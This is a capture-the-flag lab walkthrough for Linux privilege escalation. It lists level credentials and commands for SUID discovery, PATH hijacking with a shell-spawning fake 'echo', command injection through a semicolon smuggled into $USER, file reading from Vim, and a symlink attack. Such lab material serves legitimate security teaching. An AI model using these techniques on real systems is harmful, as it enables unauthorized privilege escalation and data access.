2) AC_1.02 - Set User ID (SUID)
->Credentials: level00 / level00

-> Concept: Identifying files with the SUID (Set-user-ID) bit, which allows a user to execute a binary with the permissions of the file owner.

-> Exploitation:
  Run the following command to locate vulnerable binaries:

  Bash
  find / -user flag00 -perm /u+s 2>/dev/null
  -> -user flag00: Filters for files owned by the target user.
  -> -perm /u+s: Specifically looks for the SUID bit.
  -> 2>/dev/null: Redirects "Permission Denied" errors to the null device for a cleaner output.

-> Discovery: The command returns /usr/share/nano/fishy. Executing this binary reveals the flag.

-> Observation: The output 1000 1001 1001 represents the Real UID (level00), Effective UID (flag00), and GroupID respectively.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

3) AC_1.03 - Arbitrary Command Execution (PATH Hijacking)
-> Credentials: level01 / level01

-> Vulnerability: The binary /home/flag01/flag01 likely calls a system command (like echo) without using an absolute path.

-> Exploitation:

  1. Navigate to a writable directory: cd /tmp
  2. Create a malicious "echo" script that spawns a shell:

  Bash
  echo "/bin/sh" > echo
  chmod +x echo

  3. Modify the PATH variable to prioritize /tmp:

  Bash
  export PATH=/tmp:$PATH

  4. Run the vulnerable program: /home/flag01/flag01. The program will execute your "echo" (the shell) with flag01 privileges.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

4) AC_1.04 - Arbitrary Command Execution 2 (Env Injection)
-> Credentials: level02 / level02

-> Vulnerability: Command injection via environment variables. The binary uses the $USER variable inside a system() or popen() call.

-> Exploitation:
  Inject a second command using a semicolon (;):

  Bash
  export USER=';cat /home/flag02/flag.txt'
  /home/flag02/flag02
  -> The semicolon breaks the original command string, allowing cat to execute with the binary's elevated SUID privileges.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

5) AC_1.05 - Exit VIM (GTFOBins)
-> Credentials: level03 / level03

-> Vulnerability: Misconfigured text editor permissions.

-> Exploitation: If the system drops you into a Vim-like interface or allows you to run it:
  1. Type :e /home/flag03/ to browse the directory.
  2. Locate the flag file and press Enter to read its contents directly within the editor.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

6) AC_1.06 - Read Flag (Symlink Attack)
-> Credentials: level04 / level04

-> Concept: Bypassing path restrictions using symbolic links.

-> Exploitation:

  Bash
  cd /home/level04
  ln -s /home/flag04/flag.txt fintoFile
  /home/flag04/flag04 /home/level04/fintoFile
  -> By passing a link that points to the protected flag, the binary (which has the rights to read it) opens the link and reveals the content.
